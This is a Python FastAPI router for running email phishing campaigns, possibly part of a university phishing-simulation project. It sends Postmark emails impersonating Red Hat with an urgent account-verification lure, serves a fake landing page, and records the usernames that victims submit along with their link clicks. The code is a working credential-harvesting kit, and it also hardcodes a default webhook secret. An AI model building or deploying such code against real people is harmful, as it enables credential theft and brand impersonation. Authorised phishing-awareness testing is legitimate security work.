"""
Email phishing campaign router.
Handles batch email sending via Postmark, landing page serving, and credential capture.
"""

import os
import logging
import csv
from datetime import datetime
from typing import List
from pydantic import BaseModel
from fastapi import APIRouter, Request, Header, HTTPException, Form
from fastapi.responses import HTMLResponse
from app.config import get_settings

logger = logging.getLogger("PhishingRouter")
settings = get_settings()

router = APIRouter(prefix="/api/email", tags=["email-campaigns"])

# Initialize Postmark client (lazy — only if key is set)
postmark = None
if settings.postmark_api_key:
    try:
        from postmarker.core import PostmarkClient
        postmark = PostmarkClient(server_token=settings.postmark_api_key)
    except Exception as e:
        logger.warning(f"Postmark client failed to initialize: {e}")

# Paths
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(CURRENT_DIR, "campaign_results.csv")
LANDING_PAGE_PATH = os.path.join(CURRENT_DIR, "LandingPage.html")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "ncsu_secure_2026")


# --- Pydantic Models ---

class Person(BaseModel):
    id: str
    name: str
    role: str
    email: str


class BatchRequest(BaseModel):
    recipients: List[Person]
    description: str


# --- HELPER: CSV Logging ---

def log_event(uid: str, event_type: str, details: str = ""):
    """Appends an event to the local CSV database."""
    file_exists = os.path.isfile(LOG_FILE)
    with open(LOG_FILE, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["Timestamp", "User_ID", "Event", "Details"])
        writer.writerow([
            datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            uid,
            event_type,
            details
        ])


# --- ENDPOINTS ---

@router.get("/verify", response_class=HTMLResponse)
async def serve_landing_page(uid: str):
    """Serves the phishing landing page and logs the arrival."""
    logger.info(f"[LANDING PAGE LOADED] User: {uid}")
    log_event(uid, "LANDING_PAGE_LOADED")

    if not os.path.exists(LANDING_PAGE_PATH):
        logger.error(f"LandingPage.html not found at: {LANDING_PAGE_PATH}")
        return HTMLResponse(
            f"<h1>Error: LandingPage.html not found</h1><p>Expected: {LANDING_PAGE_PATH}</p>",
            status_code=404
        )

    with open(LANDING_PAGE_PATH, "r", encoding="utf-8") as f:
        content = f.read()

    return HTMLResponse(content=content)


@router.post("/submit-credentials")
async def handle_submission(username: str = Form(...), password: str = Form(...), uid: str = Form(None)):
    """Captures credentials when user submits the form on the landing page."""
    logger.warning(f"[COMPROMISED] User {uid} submitted credentials - Username: {username}")
    log_event(uid, "COMPROMISED", f"Username: {username}")

    return HTMLResponse("""
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body { font-family: "RedHatDisplay", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%); }
            .message { background: white; padding: 50px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; max-width: 500px; }
            .checkmark { width: 60px; height: 60px; border-radius: 50%; background: #4caf50; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
            .checkmark svg { width: 30px; height: 30px; stroke: white; stroke-width: 3; fill: none; }
            h2 { color: #151515; margin-bottom: 16px; font-size: 24px; }
            p { color: #6a6e73; line-height: 1.6; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class="message">
            <div class="checkmark">
                <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
            <h2>Verification Complete</h2>
            <p>Your Red Hat account has been successfully verified.</p>
            <p style="font-size: 14px;">You may now close this window.</p>
        </div>
    </body>
    </html>
    """)


@router.post("/webhooks/postmark")
async def postmark_webhook(request: Request, x_postmark_secret: str = Header(None)):
    """Receives real-time click tracking data from Postmark."""
    if x_postmark_secret != WEBHOOK_SECRET:
        logger.warning("Invalid webhook secret")
        raise HTTPException(status_code=401, detail="Invalid webhook secret")

    data = await request.json()
    if data.get("RecordType") == "Click":
        uid = data.get("Metadata", {}).get("user_uid")
        logger.info(f"[EMAIL CLICK] User {uid} clicked the phishing link.")
        log_event(uid, "EMAIL_CLICK")
    return {"status": "ok"}


@router.post("/campaign/batch")
async def send_batch_campaign(request: BatchRequest):
    """Sends batch phishing emails that link to the landing page."""
    if postmark is None:
        raise HTTPException(status_code=503, detail="Postmark not configured. Set POSTMARK_API_KEY in .env")

    base_url = settings.base_url
    logger.info(f"Starting batch campaign with {len(request.recipients)} recipients")

    recipients = request.recipients
    description = request.description

    if not recipients:
        raise HTTPException(status_code=400, detail="No recipients provided")

    sent_count = 0
    failed_count = 0

    for person in recipients:
        uid = f"batch_{person.id}_{int(datetime.now().timestamp())}"

        if not person.email:
            logger.warning(f"Skipping {person.name}, no email provided")
            failed_count += 1
            continue

        try:
            postmark.emails.send(
                From="pkengso@ncsu.edu",
                To=person.email,
                Subject="Red Hat Account Security Alert - Action Required",
                HtmlBody=f"""
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <style>
                        body {{ font-family: "RedHatDisplay", Arial, sans-serif; color: #151515; margin: 0; padding: 0; background: #f5f5f5; }}
                        .container {{ max-width: 600px; margin: 0 auto; background: white; }}
                        .header {{ background: linear-gradient(90deg, #ee0000 0%, #a60000 100%); padding: 30px 20px; text-align: center; }}
                        .header h1 {{ color: white; margin: 0; font-size: 28px; font-weight: 500; }}
                        .content {{ padding: 40px 30px; }}
                        .content h2 {{ color: #ee0000; margin-bottom: 20px; font-size: 22px; }}
                        .content p {{ line-height: 1.6; margin-bottom: 15px; color: #151515; }}
                        .alert-box {{ background: #fef6e6; border-left: 4px solid #f0ad4e; padding: 15px; margin: 20px 0; border-radius: 4px; }}
                        .button {{ display: inline-block; background: #ee0000; color: white !important; padding: 14px 32px; text-decoration: none; border-radius: 4px; font-weight: 600; margin: 25px 0; box-shadow: 0 2px 4px rgba(238,0,0,0.2); }}
                        .footer {{ padding: 30px; text-align: center; font-size: 12px; color: #6a6e73; background: #f5f5f5; border-top: 1px solid #e8e8e8; }}
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="header"><h1>RED HAT</h1></div>
                        <div class="content">
                            <h2>Security Verification Required</h2>
                            <p>Dear {person.name},</p>
                            <p>{description}</p>
                            <div class="alert-box">
                                <strong>Immediate Action Required:</strong> We've detected unusual activity on your Red Hat account. To protect your data, you must verify your credentials immediately.
                            </div>
                            <p>Click the button below to complete the security verification process:</p>
                            <p style="text-align: center;">
                                <a href="{base_url}/api/email/verify?uid={uid}" class="button">Verify My Account Now</a>
                            </p>
                            <p style="color: #6a6e73; font-size: 14px; margin-top: 30px;">
                                <strong>Time-Sensitive:</strong> This security verification must be completed within 24 hours.
                            </p>
                        </div>
                        <div class="footer">
                            <p><strong>&copy; 2025 Red Hat, Inc.</strong> All rights reserved.</p>
                            <p>This email was sent to: {person.email}</p>
                        </div>
                    </div>
                </body>
                </html>
                """,
                TrackLinks='HtmlAndText',
                Metadata={
                    "user_uid": uid,
                    "person_name": person.name,
                    "role": person.role,
                    "campaign_type": "batch"
                }
            )

            logger.info(f"Email sent to {person.email}")
            log_event(uid, "EMAIL_SENT", f"Batch: {person.name} ({person.role})")
            sent_count += 1

        except Exception as e:
            logger.error(f"Failed to send to {person.email}: {str(e)}")
            log_event(uid, "EMAIL_FAILED", f"Error: {str(e)}")
            failed_count += 1

    return {
        "success": True,
        "count": sent_count,
        "failed": failed_count,
        "total": len(recipients),
        "message": f"Successfully sent {sent_count} out of {len(recipients)} phishing emails",
        "landing_page_url": f"{base_url}/api/email/verify"
    }
